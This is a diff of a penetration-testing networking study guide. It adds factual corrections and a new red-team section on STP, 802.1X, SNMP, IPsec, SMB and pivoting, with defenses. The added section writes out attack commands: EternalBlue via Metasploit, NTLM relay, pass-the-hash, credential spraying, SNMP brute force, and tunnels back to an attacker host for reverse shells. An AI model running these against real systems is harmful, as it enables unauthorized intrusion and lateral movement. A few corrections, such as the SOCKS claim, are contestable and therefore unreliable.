@@ -2764,14 +2764,19 @@ sudo hostapd hostapd.conf
 
 **KRACK Attack (Key Reinstallation Attack):**
 
-CVE-2017-13082 - Forces nonce reuse in WPA2 4-way handshake.
+KRACK is a **family of CVEs** — not a single attack against the standard 4-way handshake alone:
+
+> **CVE-2017-13082** specifically targets the **Fast BSS Transition (FT) handshake** (802.11r), where the AP retransmits EAPOL frames, allowing nonce reuse. The 4-way handshake variants are covered by other CVEs in the family (CVE-2017-13077, 13078, 13079, etc.).
+
+> **Affects all WPA2 implementations** was true at discovery (2017) but **most devices were patched rapidly (2017-2018)**. Unpatched devices are still vulnerable; patched devices are not.
 
 ```
-Attack targets:
+Attack mechanism:
 - Client during handshake
-- Forces reinstallation of already-in-use key
-- Allows packet decryption and injection
-- Affects all WPA2 implementations
+- Forces reinstallation of already-in-use PTK/GTK (key)
+- Resets nonce (packet number) counter to a previously used value
+- Allows packet decryption and injection (worst case: decryption + forged injection)
+- Severity varies by cipher: TKIP and GCMP worst (bidirectional); CCMP lower (replay/decrypt only)
 
 Mitigation:
 - Patch clients and APs
@@ -3020,13 +3025,15 @@ WPA3 requires MFP by default!
 
 | Field | Size | Description |
 | --- | --- | --- |
-| Preamble | 7 bytes | Alternating 1s and 0s for clock sync |
-| SFD | 1 byte | 10101011 pattern; marks frame start |
-| Destination MAC | 6 bytes | Receiver MAC address |
+| Preamble | 7 bytes | Alternating 1s and 0s for clock sync — **prepended by the Physical Layer; not part of the MAC frame proper** |
+| SFD (Start Frame Delimiter) | 1 byte | 10101011 pattern; marks frame start — **also Physical Layer overhead, stripped before the MAC layer processes the frame** |
+| Destination MAC | 6 bytes | Receiver MAC address — **this is where the actual Ethernet frame begins at the MAC sublayer** |
 | Source MAC | 6 bytes | Sender MAC address |
 | Type/Length | 2 bytes | EtherType or payload size (max 1500) |
 | Payload | 46–1500 bytes | Encapsulated Layer 3 packet |
 | FCS (CRC) | 4 bytes | Error detection checksum |
+
+> **Wireshark/analysis note:** Packet capture tools (Wireshark, tcpdump) show Ethernet frames starting from the Destination MAC address — the 8-byte preamble+SFD are stripped by the NIC before the frame reaches the OS. The FCS is also typically omitted in captures. Don’t be confused when captured frames appear shorter than the full 1518-byte maximum.
 
 **Frame Size:** Minimum 64 bytes, Maximum 1518 bytes (without VLAN tag)
 
@@ -6983,10 +6990,10 @@ Note: NAT is commonly used to extend IPv4 address utility in private networks.
 
 #### Distance Vector Routing (DVR)
 
-**Header Size:** Typically 24 bytes (RIP header; varies by protocol implementation)
-
 **Introduction**
 - A **dynamic routing algorithm** based on **Bellman‑Ford**.
+
+> **Note:** DVR is an algorithm/concept, not a protocol with a header. The header size shown in some texts refers to RIP (one DVR implementation) whose wire header is 4 bytes + 20 bytes per route entry. Do not conflate the algorithm with any one protocol.
 - Routers discover best paths without manual configuration.
 
 **Three Golden Rules**
@@ -7390,7 +7397,7 @@ Step 3: 2001:0db8:0000:0000:0000:0000:0000:0001
 **Types of Unicast:**
 - **Global Unicast (2000::/3):** Internet-routable addresses (like public IPv4)
 - **Link-Local (fe80::/10):** Only valid on local link, not routed (like 169.254.x.x in IPv4)
-- **Unique Local (fc00::/7):** Private addresses, not routed on Internet (like RFC 1918 in IPv4)
+- **Unique Local (fd00::/8 in practice, block fc00::/7):** Private addresses, not routed on Internet (like RFC 1918 in IPv4). In practice only fd00::/8 (L-bit=1) is used; fc00::/8 is reserved and unallocated per RFC 4193
 - **Loopback (::1/128):** Local machine (like 127.0.0.1 in IPv4)
 - **Unspecified (::/128):** No address assigned
 
@@ -7422,11 +7429,11 @@ Step 3: 2001:0db8:0000:0000:0000:0000:0000:0001
 - Used for: Neighbor Discovery, router advertisements
 - **EUI-64:** Often derived from MAC address
 
-**Unique Local (fc00::/7, commonly fd00::/8):**
-- Private addresses for internal networks
-- Not routed on global Internet
+**Unique Local (fd00::/8 in practice):**
+- Private addresses for internal networks, not routed on global Internet
 - Replacement for IPv4 private addresses
-- Randomly generated to avoid collisions
+- RFC 4193 defines the fc00::/7 block; the L-bit distinguishes halves: fc00::/8 (L=0) is reserved/unallocated; fd00::/8 (L=1) is the only deployed range
+- Always generate a random 40-bit Global ID within fd00::/8 to avoid collisions
 
 **Global Unicast (2000::/3):**
 - Publicly routable on Internet
@@ -8261,7 +8268,7 @@ After this section, you'll understand:
 - `192.168.0.0/16` → 192.168.0.0 - 192.168.255.255 (65K addresses)
 
 **IPv6 Unique Local:**
-- `fc00::/7` (typically `fd00::/8` used in practice)
+- `fd00::/8` (the only deployed ULA range; `fc00::/8` is reserved and unallocated per RFC 4193)
 
 **Loopback Addresses:**
 - **IPv4:** 127.0.0.0/8 (entire range, 127.0.0.1 most common)
@@ -8327,7 +8334,12 @@ A penetration tester identifies target services running on discovered IP address
 
 ## 16. MIME Types — Multipurpose Internet Mail Extensions
 
-> **Context note:** MIME is an application-layer concept — it describes content metadata attached to HTTP responses and email messages, not a networking protocol. It is covered here because it directly feeds into web attack surface understanding, but the full context for MIME (HTTP headers, file upload security, browser content sniffing) belongs to web security study. Read this section alongside your HTTP and web application security material.
+> [!WARNING]
+> **Placement note:** MIME is **NOT a networking protocol**. It is an application-layer content metadata standard used in HTTP and email. It does not belong in a networking fundamentals module by strict classification — it belongs in a Web Security module.
+>
+> It is included here because: (1) it appears in HTTP responses at the application layer and understanding it is prerequisite to web attack surface analysis, and (2) file upload vulnerabilities (MIME bypass, polyglot files, XXE) are among the most common real-world attack vectors.
+>
+> **Read this section when studying web application security.** If you are progressing linearly, you can skip to Section 17 (Firewalls) and return here when you start web security. This section is a standalone reference — skipping it does not break any later networking sections.
 
 **Section Overview:**
 MIME types are metadata labels telling applications what kind of content they're receiving. This seems innocuous, but MIME handling is a critical security control — and it fails constantly. Mishandling MIME types enables file upload bypasses, XXE attacks, polyglot file exploits, and browser script execution. This section covers both offensive techniques (polyglot files) and defensive controls (MIME validation, Content-Disposition headers). If you understand MIME, you unlock an entire category of vulnerabilities.
@@ -8780,7 +8792,7 @@ DENY all
 - ❌ No application-layer inspection
 - ❌ Difficult to configure for complex protocols (FTP, SIP)
 
-**OSI Layer:** Network Layer (Layer 3)
+**OSI Layers:** Network Layer (Layer 3) + Transport Layer (Layer 4) — packet filters inspect IP addresses at L3 *and* port numbers/TCP flags at L4; a pure L3-only filter would have no port awareness
 
 #### 17.2.2 Second Generation: Stateful Inspection Firewalls
 
@@ -8836,9 +8848,11 @@ SRC_IP         DST_IP        SRC_PORT  DST_PORT  STATE        PROTO
 - Full protocol inspection and validation
 
 **2. Circuit-Level Gateway:**
-- Operates at session layer
-- Creates circuits between client and server
-- Example: SOCKS proxy
+- Operates between the Network and Transport layers — verifies the TCP handshake establishes a legitimate connection, then relays the byte stream without inspecting application content
+- Does NOT parse application-level commands; it only validates that the TCP circuit was properly established
+- Creates a transparent relay: once the circuit is validated, data passes through directly
+
+> **⚠️ SOCKS ≠ Circuit-Level Gateway:** SOCKS (Socket Secure) is an **application-layer tunnel proxy** protocol. It understands application commands (CONNECT, BIND, UDP ASSOCIATE) and operates at the application layer. Calling SOCKS a "circuit-level gateway" is a common textbook error. A true circuit-level gateway (Cheswick/Bellovin definition) relays TCP streams without any application-layer command parsing.
 
 **Deep Packet Inspection (DPI):**
 - Examines payload content, not just headers
@@ -9851,19 +9865,34 @@ Example /24:
 - 2 subnets with 50 hosts each
 - 3 subnets with 10 hosts each
 
-**Starting with 192.168.1.0/24:**
+> **⚠️ Common textbook error corrected:** A /24 (254 hosts total) cannot satisfy this scenario. After allocating /25 (100h) + /26 (50h) + /26 (50h) the entire /24 is consumed. No address space remains for the three /28s. Using 192.168.0.0/22 (1022 usable hosts) gives enough room.
 
-**Allocation:**
+**Starting with 192.168.0.0/22 (255.255.252.0):**
+
+**Allocation (largest-first — always allocate largest subnets first):**
 ```
-100 hosts → /25 (126 hosts) → 192.168.1.0/25
+Step 1: 100 hosts → need /25 (2^7 - 2 = 126 hosts)
+        → 192.168.0.0/25   (range: .0.1 – .0.126, broadcast .0.127)
 
-50 hosts → /26 (62 hosts) → 192.168.1.128/26
-50 hosts → /26 (62 hosts) → 192.168.1.192/26
+Step 2: 50 hosts → need /26 (2^6 - 2 = 62 hosts)
+        → 192.168.0.128/26 (range: .0.129 – .0.190, broadcast .0.191)
 
-10 hosts → /28 (14 hosts) → 192.168.1.240/28
-10 hosts → /28 (14 hosts) → 192.168.1.224/28 (carved from .192/26)
-10 hosts → /28 (14 hosts) → 192.168.1.208/28 (carved from .192/26)
+Step 3: 50 hosts → need /26 (62 hosts)
+        → 192.168.0.192/26 (range: .0.193 – .0.254, broadcast .0.255)
+
+Step 4: 10 hosts → need /28 (2^4 - 2 = 14 hosts)
+        → 192.168.1.0/28   (range: .1.1 – .1.14, broadcast .1.15)
+
+Step 5: 10 hosts → /28 (14 hosts)
+        → 192.168.1.16/28  (range: .1.17 – .1.30, broadcast .1.31)
+
+Step 6: 10 hosts → /28 (14 hosts)
+        → 192.168.1.32/28  (range: .1.33 – .1.46, broadcast .1.47)
+
+Remaining space: 192.168.1.48 onward (still within .0/22) — unallocated for future growth
 ```
+
+**Why largest-first?** If you allocate small subnets first they may not fall on proper boundaries for larger subnets, wasting addresses. Always allocate from largest to smallest requirement.
 
 **Benefits:**
 - Minimizes wasted IP addresses
@@ -11351,6 +11380,493 @@ During an incident response, you'll use this consolidated knowledge to trace an 
 
 ---
 
+
+---
+
+## 20. Critical Missing Protocols — Security-Essential Reference
+
+> **Why this section exists:** The learning path targets Penetration Testing and Red Teaming. The protocols in this section are either primary attack surfaces (SMB, SNMP), authentication infrastructure (802.1X, Kerberos), foundational network stability mechanisms (STP), or essential VPN/tunneling technology (IPsec). They were absent from earlier sections and are added here as targeted deep-dives.
+
+---
+
+### 20.1 Spanning Tree Protocol (STP / RSTP)
+
+**Section Overview:**
+STP prevents Layer 2 loops in switched networks. It is foundational to understand switch behaviour, and STP manipulation is a real attack vector for gaining network access or causing disruption.
+
+**Why STP Exists:**
+Switches forward frames based on MAC addresses. If a network has redundant paths (loops), frames can circulate forever — a broadcast storm that saturates bandwidth and crashes the network. STP detects loops and logically blocks redundant links.
+
+**How STP Works (802.1D):**
+
+1. **Root Bridge Election:** All switches exchange Bridge Protocol Data Units (BPDUs). The switch with the lowest Bridge ID (priority + MAC) becomes the Root Bridge.
+2. **Port Roles assigned per bridge:**
+   - **Root Port (RP):** Best path toward the Root Bridge — one per non-root switch
+   - **Designated Port (DP):** Sends BPDUs on a segment — one per segment
+   - **Blocked Port (Non-Designated):** Discards frames to break loops
+3. **Path Cost:** Based on bandwidth (100 Mbps = cost 19, 1 Gbps = cost 4, 10 Gbps = cost 2)
+4. **Port States:** Blocking → Listening → Learning → Forwarding (802.1D takes 30-50 seconds to converge)
+
+**RSTP (Rapid STP, 802.1W):**
+- Converges in 1-2 seconds (versus 30-50s for classic STP)
+- Port roles: Root, Designated, Alternate (backup root port), Backup
+- Replaces 802.1D in all modern networks; MSTP (802.1s) extends RSTP for multiple VLANs
+
+**Security Relevance:**
+
+```
+STP Attack: Root Bridge Takeover
+
+An attacker connected to a switch sends BPDUs with a lower Bridge ID
+(e.g., priority 0) than the legitimate root bridge. All switches
+recalculate paths with the attacker as root → all traffic flows
+through the attacker's device → full MITM without ARP poisoning.
+
+Attack tool:
+  yersinia -G   # Select STP → "Claiming Root Role"
+  # Or with Scapy: craft BPDUs with priority 0
+
+Defense:
+  - Portfast + BPDU Guard on access ports:
+      If a BPDU is received on a Portfast-enabled port, the port
+      is immediately err-disabled — prevents rogue switches/devices
+  - Root Guard: Prevents a port from becoming a Root Port even if
+      it receives superior BPDUs
+  
+  Cisco config:
+    interface GigabitEthernet0/1
+      spanning-tree portfast
+      spanning-tree bpduguard enable
+    ! Global:
+    spanning-tree portfast bpduguard default
+```
+
+**Key Commands (Cisco):**
+```
+show spanning-tree                 ! Per-VLAN STP state
+show spanning-tree detail          ! Root bridge, port costs
+show spanning-tree blockedports    ! Which ports are blocking
+debug spanning-tree events         ! Live STP activity
+```
+
+**Key Takeaway:** STP is invisible until it breaks. In a pentest, sending superior BPDUs from a connected device can redirect all switch traffic through you — a physical-access MITM attack. BPDU Guard is the primary defense.
+
+---
+
+### 20.2 802.1X and EAP — Network Access Control
+
+**Section Overview:**
+802.1X is the IEEE standard for port-based Network Access Control (NAC). It is the authentication mechanism behind enterprise Wi-Fi (WPA2/WPA3-Enterprise) and wired switch port authentication. For red teams, understanding 802.1X is necessary for bypassing it; for blue teams, it is the strongest Layer 2 admission control available.
+
+**Three Components:**
+- **Supplicant:** The client device requesting access (laptop, phone)
+- **Authenticator:** The network device controlling access (switch port, Wi-Fi AP)
+- **Authentication Server:** RADIUS server (FreeRADIUS, Microsoft NPS) that validates credentials
+
+**Protocol Flow:**
+```
+Supplicant           Authenticator (Switch)       RADIUS Server
+    │                       │                           │
+    │── EAPOL-Start ────────>│                           │
+    │<─ EAP-Request/Identity ─│                           │
+    │── EAP-Response/Identity ─>│── RADIUS Access-Request ──>│
+    │                       │<── RADIUS Access-Challenge ──│
+    │<─ EAP-Request ──────────│                           │
+    │── EAP-Response ──────────>│── RADIUS Access-Request ──>│
+    │                       │<── RADIUS Access-Accept ────│
+    │<─ EAP-Success ──────────│                           │
+    │   [Port Authorized]     │                           │
+```
+
+**EAP Methods (listed from weakest to strongest):**
+
+| Method | Authentication | Security | Notes |
+|--------|---------------|----------|-------|
+| EAP-MD5 | Password (challenge-response) | ❌ Weak | Offline dictionary attack possible; no server auth |
+| LEAP (Cisco) | Username/password | ❌ Broken | Offline dictionary attack; deprecated |
+| EAP-TLS | Mutual certificate | ✅ Strong | Both client and server have certificates; gold standard |
+| EAP-TTLS | Server cert + inner auth | ✅ Good | Server cert only; inner auth (MSCHAPv2, PAP) tunneled |
+| PEAP | Server cert + inner auth | ✅ Good | Most common enterprise deployment; inner MSCHAPv2 |
+
+**PEAP/MSCHAPv2 Attack — The Common Enterprise Wi-Fi Attack:**
+```
+Attack vector: Rogue AP with valid-looking (or self-signed) certificate
+
+1. Attacker deploys rogue AP with SSID matching corporate network
+2. Client connects and initiates PEAP
+3. Attacker presents self-signed certificate
+4. If client does NOT validate server certificate → accepts rogue cert
+5. Attacker captures MSCHAPv2 challenge-response
+6. Offline crack with hashcat: hashcat -m 5500 ntlm_hash.txt wordlist.txt
+   (or use asleap for LEAP hashes)
+
+Fix: Always validate server certificate AND pin the CA in client supplicant config.
+     Without certificate validation, PEAP provides false security.
+
+Tools:
+  hostapd-wpe    # Rogue AP for PEAP/EAP credential capture
+  asleap         # LEAP hash cracker
+  eaphammer      # Modern EAP attack framework
+```
+
+**802.1X Bypass Techniques:**
+- **MAC Authentication Bypass (MAB):** Devices that can't do 802.1X (printers, VoIP) fall back to MAC-based auth. Spoof a known-good MAC address of such a device.
+- **Identity theft:** In EAP-TTLS/PEAP, the outer identity is sent in cleartext before the TLS tunnel. The real username is protected inside the tunnel, but the outer identity can reveal domain/username patterns.
+- **VLAN hopping post-auth:** After authenticating on a guest VLAN, attempt to access data VLANs via trunk misconfigurations.
+
+**Defense Configuration (Cisco):**
+```
+aaa new-model
+aaa authentication dot1x default group radius
+dot1x system-auth-control
+
+interface GigabitEthernet0/1
+  switchport mode access
+  authentication port-control auto
+  dot1x pae authenticator
+  mab                          ! Fallback MAC auth for non-802.1X devices
+  authentication order dot1x mab
+  authentication priority dot1x mab
+```
+
+---
+
+### 20.3 SNMP — Simple Network Management Protocol
+
+**Section Overview:**
+SNMP is the primary network device management protocol. For attackers it is a reconnaissance goldmine — SNMP can expose entire device configurations, routing tables, interface lists, and connected devices. For defenders, securing SNMP is a basic hardening requirement that is frequently missed.
+
+**How SNMP Works:**
+- **Manager:** The monitoring system (SolarWinds, PRTG, Nagios) that queries devices
+- **Agent:** The daemon running on managed devices (routers, switches, servers) that responds to queries
+- **MIB (Management Information Base):** Hierarchical database of manageable objects on each device
+- **OID (Object Identifier):** Unique dotted path to a specific MIB object (e.g., `1.3.6.1.2.1.1.1.0` = sysDescr)
+
+**SNMP Versions:**
+
+| Version | Authentication | Encryption | Status |
+|---------|---------------|-----------|--------|
+| **SNMPv1** | Community string (cleartext) | None | ⛔ Insecure; legacy only |
+| **SNMPv2c** | Community string (cleartext) | None | ⚠️ Most common; still insecure |
+| **SNMPv3** | Username + auth (MD5/SHA) | DES/AES | ✅ Secure; use this |
+
+**Community Strings (v1/v2c):**
+- **Public:** Read-only access (default on most devices — almost always left unchanged)
+- **Private:** Read-write access (default on most devices — allows config changes)
+- Sent in **cleartext** over UDP — sniffable on the wire
+
+**Offensive SNMP (Red Team):**
+```bash
+# Brute-force community strings
+onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1
+
+# SNMPwalk — dump entire MIB tree (requires known community string)
+snmpwalk -v2c -c public 192.168.1.1
+
+# Get specific OID — system description
+snmpget -v2c -c public 192.168.1.1 1.3.6.1.2.1.1.1.0
+
+# Dump all interfaces
+snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.2.2.1.2
+
+# Dump routing table
+snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21
+
+# Dump ARP table (reveals all IP/MAC pairs the device knows)
+snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.22
+
+# nmap SNMP enumeration scripts
+nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-netstat,snmp-sysdescr 192.168.1.1
+
+# Metasploit SNMP scanner
+use auxiliary/scanner/snmp/snmp_enumifaces
+use auxiliary/scanner/snmp/snmp_enum
+```
+
+**What SNMP Exposes:**
+- Device model, OS version, uptime (fingerprinting)
+- All interface names, IPs, MACs, speeds
+- Routing table (internal network map)
+- ARP cache (all local hosts)
+- Running processes and installed software (MIB-II host resources)
+- SNMP write access = change device configuration (e.g., add a default route pointing to attacker)
+
+**Defense:**
+```
+! Cisco — disable SNMPv1/v2c, use SNMPv3
+no snmp-server community public
+no snmp-server community private
+snmp-server group SECUREGRP v3 priv
+snmp-server user SNMPUSER SECUREGRP v3 auth sha MyAuthPass priv aes 128 MyPrivPass
+
+! Restrict SNMP access with ACL
+access-list 10 permit 192.168.1.10    ! Only management station
+snmp-server community STRONGSTRING ro 10
+
+! Firewall: Block UDP 161 from all but management hosts
+```
+
+**Key Takeaway:** Default community strings ("public"/"private") on UDP port 161 are an immediate critical finding in any pentest. SNMPv3 with auth+priv is the only secure version.
+
+---
+
+### 20.4 IPsec — IP Security Architecture
+
+**Section Overview:**
+IPsec is the framework for authenticating and encrypting IP traffic. It is the foundation of site-to-site VPNs and remote access VPNs. Understanding IPsec is essential for both attacking VPN configurations and understanding network tunneling for red team infrastructure.
+
+**IPsec Components:**
+
+| Component | Purpose |
+|-----------|---------|
+| **AH (Authentication Header, Protocol 51)** | Integrity + authentication; NO encryption |
+| **ESP (Encapsulating Security Payload, Protocol 50)** | Encryption + integrity + authentication |
+| **IKE (Internet Key Exchange, UDP 500/4500)** | Key negotiation and SA establishment |
+| **SA (Security Association)** | One-way agreement on algorithm, keys, and SPI |
+
+**Two Modes:**
+- **Transport Mode:** Encrypts payload only; original IP header preserved. Used between two end hosts.
+- **Tunnel Mode:** Encrypts entire original packet and adds new IP header. Used for VPNs (original packet hidden inside new packet).
+
+```
+Transport Mode:  [Original IP Header][AH/ESP][Original Payload]
+Tunnel Mode:     [New IP Header][AH/ESP][Original IP Header][Original Payload]
+```
+
+**IKE Phases:**
+
+**IKEv1 (legacy):**
+- Phase 1: Establish secure channel (ISAKMP SA) using Diffie-Hellman
+- Phase 2: Negotiate IPsec SAs for actual data protection
+
+**IKEv2 (modern, RFC 7296):**
+- Single exchange: IKE_SA_INIT + IKE_AUTH → faster and more efficient
+- Built-in NAT-T (NAT Traversal), EAP authentication support, MOBIKE for mobile clients
+
+**Common VPN Configurations:**
+```bash
+# Identify IPsec endpoints (IKE on UDP 500)
+nmap -sU -p 500,4500 192.168.1.1
+
+# IKE fingerprinting / enumeration
+ike-scan 192.168.1.1
+ike-scan --aggressive --id=vpnclient 192.168.1.1
+
+# Test for IKEv1 aggressive mode (sends PSK hash in cleartext → offline crack)
+ike-scan --aggressive --id=0.0.0.0 192.168.1.1
+```
+
+**Security Issues:**
+
+| Issue | Risk |
+|-------|------|
+| **IKEv1 Aggressive Mode** | PSK hash sent before encryption; offline dictionary attack possible |
+| **Weak PSK (Pre-Shared Key)** | Offline cracking of captured IKE handshake (psk-crack, hashcat) |
+| **DH Group 1/2 (768/1024-bit)** | Computationally breakable; use Group 14 (2048-bit) or higher |
+| **Null encryption** | Some configs allow NULL encryption for debugging — no protection |
+| **Split tunneling misconfiguration** | Traffic bypasses VPN, leaks to internet |
+
+**Defense:**
+- Use IKEv2 (deprecate IKEv1)
+- Disable aggressive mode on IKEv1 deployments
+- Use certificate authentication instead of PSK for site-to-site
+- Use strong DH groups (≥ Group 14)
+- Deploy with Perfect Forward Secrecy (PFS) enabled
+
+---
+
+### 20.5 SMB — Server Message Block
+
+**Section Overview:**
+SMB is the Windows file-sharing and network services protocol. It runs on TCP 445 and (legacy) TCP 139. SMB is one of the highest-value targets in internal pentests: it exposes file shares, user enumeration, relay attack vectors, and has been the delivery mechanism for major exploits (EternalBlue, WannaCry). Understanding the protocol is essential before touching any Windows environment.
+
+**SMB Versions:**
+
+| Version | OS Support | Security | Notes |
+|---------|-----------|---------|-------|
+| **SMBv1** | Windows XP, 2000, 2003 | ⛔ Broken | Remove immediately; EternalBlue (MS17-010) exploits this |
+| **SMBv2** | Vista, Server 2008+ | ⚠️ Better | No more plaintext passwords; signing optional |
+| **SMBv2.1** | Win 7, Server 2008 R2+ | ⚠️ Better | Added opportunistic locking |
+| **SMBv3** | Win 8, Server 2012+ | ✅ Good | Encryption support (AES-CCM, AES-GCM) |
+| **SMBv3.1.1** | Win 10, Server 2016+ | ✅ Best | Mandatory pre-authentication integrity; AES-128-GCM |
+
+**SMB Authentication Methods:**
+- **NTLMv1:** Challenge-response using NT hash; **broken** — do not use
+- **NTLMv2:** Improved challenge-response with timestamp; still crackable offline
+- **Kerberos:** Default in Active Directory environments; ticket-based; no password hash sent over wire
+
+**Critical SMB Attacks:**
+
+```bash
+# ─── ENUMERATION ──────────────────────────────────────────
+
+# List shares (no credentials)
+smbclient -L //192.168.1.10 -N
+
+# Null session enumeration
+enum4linux -a 192.168.1.10
+
+# nmap SMB scripts
+nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 192.168.1.10
+
+# CrackMapExec — Swiss army knife for SMB
+crackmapexec smb 192.168.1.0/24                        # Enumerate all hosts
+crackmapexec smb 192.168.1.0/24 -u admin -p Password1  # Spray credentials
+crackmapexec smb 192.168.1.0/24 --shares               # Enumerate shares
+
+# ─── EXPLOITATION ─────────────────────────────────────────
+
+# EternalBlue (MS17-010) — SMBv1 exploit
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+run
+
+# ─── RELAY ATTACKS ────────────────────────────────────────
+# NTLM Relay: Capture NTLMv2 challenge-response and relay to another host
+# Requires: SMB signing disabled on target
+
+# Step 1: Disable SMB and HTTP in Responder to avoid consuming the hash
+# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
+sudo responder -I eth0 -rdw
+
+# Step 2: Relay with ntlmrelayx
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# What happens: Responder poisons LLMNR/NBT-NS → victim authenticates to attacker
+# → attacker relays auth to target → gains SMB session as victim's user
+
+# ─── PASS-THE-HASH ────────────────────────────────────────
+# Use captured NT hash without cracking it
+impacket-psexec administrator@192.168.1.10 -hashes :NTHASH
+crackmapexec smb 192.168.1.10 -u administrator -H NTHASH --exec-method smbexec
+```
+
+**SMB Signing:**
+When SMB signing is **disabled** (common on workstations, not servers), NTLM relay attacks work. When **enabled**, relayed auth is rejected because the signature won't match.
+
+```bash
+# Check SMB signing status
+nmap -p 445 --script smb2-security-mode 192.168.1.0/24
+crackmapexec smb 192.168.1.0/24 --gen-relay-list unsigned_targets.txt
+```
+
+**Defense:**
+- Disable SMBv1 everywhere (Group Policy: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`)
+- Enable SMB signing on all hosts (mandatory, not just opportunistic)
+- Block TCP 445 at perimeter and between network segments
+- Enable SMB encryption (SMBv3)
+- Use Kerberos authentication (requires domain environment)
+
+---
+
+### 20.6 Network Pivoting and Port Forwarding
+
+**Section Overview:**
+Pivoting is the technique of using a compromised host as a relay to reach otherwise-inaccessible network segments. It is a core red team skill for post-exploitation lateral movement. Understanding the network layer mechanics of pivoting requires the foundational protocol knowledge covered throughout this document.
+
+**Why Pivoting is Necessary:**
+```
+Attacker (Internet)
+       │
+       │  Direct access blocked by firewall
+       ▼
+[DMZ Host — Compromised]   ← Attacker has shell here
+       │
+       │  Internal segment not directly reachable from Internet
+       ▼
+[Internal Network 10.0.0.0/8]   ← Attacker wants to reach this
+```
+
+**Pivoting Techniques:**
+
+#### Local Port Forwarding (SSH)
+Forward a port on the attacker's machine to a port on an internal host (through the pivot).
+```bash
+# Access internal RDP (10.0.0.5:3389) via pivot (pivot-host):
+ssh -L 13389:10.0.0.5:3389 user@pivot-host
+
+# Now connect: rdesktop localhost:13389  → reaches 10.0.0.5:3389
+```
+
+#### Remote Port Forwarding (SSH)
+Forward a port on the pivot to the attacker's machine. Useful for reverse shells.
+```bash
+# On pivot host: forward attacker's port 4444 to be reachable on pivot:
+ssh -R 4444:localhost:4444 attacker@attacker-ip
+
+# Reverse shell on internal host connects to pivot:4444 → attacker:4444
+```
+
+#### Dynamic Port Forwarding / SOCKS Proxy (SSH)
+Create a SOCKS5 proxy on the attacker machine; all traffic through it is tunneled via the pivot.
+```bash
+# Create SOCKS5 proxy on attacker port 1080 via pivot:
+ssh -D 1080 user@pivot-host
+
+# Route tools through it:
+proxychains nmap -sT 10.0.0.0/24           # Scan internal network
+proxychains crackmapexec smb 10.0.0.5      # SMB through pivot
+```
+
+#### Metasploit Pivoting
+```bash
+# After getting a Meterpreter session on pivot host:
+meterpreter > run post/multi/manage/autoroute SUBNET=10.0.0.0 NETMASK=255.0.0.0
+
+# Now route attacks through the pivot:
+meterpreter > background
+msf > use auxiliary/scanner/portscan/tcp
+msf > set RHOSTS 10.0.0.0/24
+msf > run
+```
+
+#### Chisel (HTTP/HTTPS Tunneling)
+When SSH is blocked but HTTP/HTTPS is allowed:
+```bash
+# On attacker (server mode):
+./chisel server -p 8080 --reverse
+
+# On pivot host (client mode):
+./chisel client attacker-ip:8080 R:socks
+
+# Routes all traffic through port 8080 HTTP — bypasses firewalls that only allow web traffic
+```
+
+#### Ligolo-ng (Modern Pivoting)
+```bash
+# Server on attacker:
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Agent on pivot:
+./agent -connect attacker-ip:11601 -ignore-cert
+
+# In ligolo UI:
+session
+start
+# Creates tun interface on attacker routable to internal network — no proxychains needed
+```
+
+**Port Forwarding Without SSH (Windows):**
+```cmd
+REM netsh portproxy — Windows native
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.0.0.5 connectport=80
+
+REM Verify:
+netsh interface portproxy show all
+```
+
+**Detection of Pivoting:**
+- Unusual SSH connections from internal hosts to external IPs
+- Internal hosts making connections to ports typically only used externally (8080, 443, 11601)
+- SOCKS proxy traffic patterns: many connections through single TCP session
+- Netflow anomalies: high connection count through one host
+- EDR alerts on chisel/ligolo binary execution
+
+**Key Takeaway:** A pivot transforms a single foothold into a network-wide attack platform. Every additional subnet reachable through your pivot multiplies your attack surface. Network segmentation (firewalls between segments, not just at the perimeter) is the primary defense.
+
+---
+
 ## 20. Summary — Key Takeaways and Next Steps
 
 **Learning Outcomes:**
@@ -12099,7 +12615,9 @@ Subnets:
 | Layer | # | Name | PDU | Devices | Protocols | Function |
 |-------|---|------|-----|---------|-----------|----------|
 | 7 | Application | Data | - | HTTP, FTP, SMTP, DNS | User interface |
-| 6 | Presentation | Data | - | SSL/TLS, JPEG, ASCII | Data format |
+| 6 | Presentation | Data | - | JPEG, GIF, ASCII, EBCDIC, encryption/encoding formats | Data format (translation, compression, encryption negotiation) |
+
+> **TLS/SSL placement note:** TLS is commonly placed at Layer 6 in OSI teaching models, but in real implementations it does not conform to the OSI Presentation Layer. TLS operates between TCP (Layer 4) and the application. In any practical or exam context, treat TLS as an application-layer protocol unless the exam specifically uses the OSI teaching model. See the TLS deep-dive section for full detail.
 | 5 | Session | Data | - | NetBIOS, RPC | Session management |
 | 4 | Transport | Segment | - | TCP, UDP | End-to-end delivery |
 | 3 | Network | Packet | Router | IP, ICMP, OSPF | Routing |
